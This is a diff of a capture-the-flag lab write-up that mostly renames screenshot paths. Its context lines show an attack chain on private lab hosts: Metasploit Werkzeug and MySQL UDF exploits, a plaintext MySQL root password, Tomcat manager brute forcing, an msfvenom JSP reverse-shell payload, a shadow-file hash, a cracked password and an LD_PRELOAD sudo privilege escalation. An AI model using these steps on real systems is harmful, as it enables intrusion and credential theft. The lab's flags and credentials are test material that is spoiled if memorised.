@@ -84,31 +84,31 @@ Nmap done: 3 IP addresses (3 hosts up) scanned in 6.98 seconds
 
 ### Dirb
 
-![](<../../../../.gitbook/assets/image (21).png>)
+![](<../../../../.gitbook/assets/image (21) (1).png>)
 
 ### Website
 
-![](<../../../../.gitbook/assets/image (55).png>)
+![](<../../../../.gitbook/assets/image (55) (1).png>)
 
-![](<../../../../.gitbook/assets/image (32).png>)
+![](<../../../../.gitbook/assets/image (32) (1).png>)
 
 ### Exploit
 
-![](<../../../../.gitbook/assets/image (13).png>)
+![](<../../../../.gitbook/assets/image (13) (1).png>)
 
 ```
 use exploit/multi/http/werkzeug_debug_rce
 ```
 
-![](<../../../../.gitbook/assets/image (60).png>)
+![](<../../../../.gitbook/assets/image (60) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (49).png>)
 
-![](<../../../../.gitbook/assets/image (20).png>)
+![](<../../../../.gitbook/assets/image (20) (1).png>)
 
-![](<../../../../.gitbook/assets/image (59).png>)
+![](<../../../../.gitbook/assets/image (59) (1).png>)
 
-![](<../../../../.gitbook/assets/image (64).png>)
+![](<../../../../.gitbook/assets/image (64) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (8).png>)
 
@@ -120,15 +120,15 @@ use exploit/multi/http/werkzeug_debug_rce
 mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 ```
 
-![](<../../../../.gitbook/assets/image (41).png>)
+![](<../../../../.gitbook/assets/image (41) (1).png>)
 
-![](<../../../../.gitbook/assets/image (61).png>)
+![](<../../../../.gitbook/assets/image (61) (1).png>)
 
-![](<../../../../.gitbook/assets/image (9).png>)
+![](<../../../../.gitbook/assets/image (9) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (11).png>)
 
-![](<../../../../.gitbook/assets/image (54).png>)
+![](<../../../../.gitbook/assets/image (54) (1).png>)
 
 ### Exploit
 
@@ -136,13 +136,13 @@ mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 use exploit/multi/mysql/mysql_udf_payload
 ```
 
-![](<../../../../.gitbook/assets/image (65).png>)
+![](<../../../../.gitbook/assets/image (65) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (46).png>)
 
-![](<../../../../.gitbook/assets/image (52).png>)
+![](<../../../../.gitbook/assets/image (52) (1).png>)
 
-![](<../../../../.gitbook/assets/image (14).png>)
+![](<../../../../.gitbook/assets/image (14) (1).png>)
 
 ![FLAG: 4c537c0dfd18bafdcd59f53c7015550e](<../../../../.gitbook/assets/image (31).png>)
 
@@ -154,9 +154,9 @@ use exploit/multi/mysql/mysql_udf_payload
 dirb http://192.6.232.5:8080
 ```
 
-![](<../../../../.gitbook/assets/image (51).png>)
+![](<../../../../.gitbook/assets/image (51) (1).png>)
 
-![](<../../../../.gitbook/assets/image (19).png>)
+![](<../../../../.gitbook/assets/image (19) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (33).png>)
 
@@ -168,11 +168,11 @@ dirb http://192.6.232.5:8080
 use auxiliary/scanner/http/tomcat_mgr_login
 ```
 
-![](<../../../../.gitbook/assets/image (53).png>)
+![](<../../../../.gitbook/assets/image (53) (1).png>)
 
-![](<../../../../.gitbook/assets/image (57).png>)
+![](<../../../../.gitbook/assets/image (57) (1).png>)
 
-![](<../../../../.gitbook/assets/image (58).png>)
+![](<../../../../.gitbook/assets/image (58) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (26).png>)
 
@@ -182,9 +182,9 @@ use auxiliary/scanner/http/tomcat_mgr_login
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o revshell.war
 ```
 
-![](<../../../../.gitbook/assets/image (36).png>)
+![](<../../../../.gitbook/assets/image (36) (1).png>)
 
-![](<../../../../.gitbook/assets/image (30).png>)
+![](<../../../../.gitbook/assets/image (30) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (10).png>)
 
@@ -202,11 +202,11 @@ CTRL+Z
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
-![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (39).png>)
+![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (39) (1).png>)
 
-![](<../../../../.gitbook/assets/image (17).png>)
+![](<../../../../.gitbook/assets/image (17) (1).png>)
 
-![](<../../../../.gitbook/assets/image (42).png>)
+![](<../../../../.gitbook/assets/image (42) (1).png>)
 
 ```
 robert:x:999:999:robert:/home/robert:
@@ -215,9 +215,9 @@ robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1
 
 
 
-![](<../../../../.gitbook/assets/image (67).png>)
+![](<../../../../.gitbook/assets/image (67) (1).png>)
 
-![](<../../../../.gitbook/assets/image (63).png>)
+![](<../../../../.gitbook/assets/image (63) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (48).png>)
 
@@ -226,11 +226,11 @@ robert:robert@1234567890!@#
 username=robert | password=robert@1234567890!@#
 ```
 
-![](<../../../../.gitbook/assets/image (43).png>)
+![](<../../../../.gitbook/assets/image (43) (1).png>)
 
 ![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (6).png>)
 
-![](<../../../../.gitbook/assets/image (18).png>)
+![](<../../../../.gitbook/assets/image (18) (1).png>)
 
 ```c
 #include <stdio.h>
@@ -258,11 +258,11 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-![](<../../../../.gitbook/assets/image (68).png>)
+![](<../../../../.gitbook/assets/image (68) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (16).png>)
 
-![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50).png>)
+![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50) (1).png>)
 
 
 
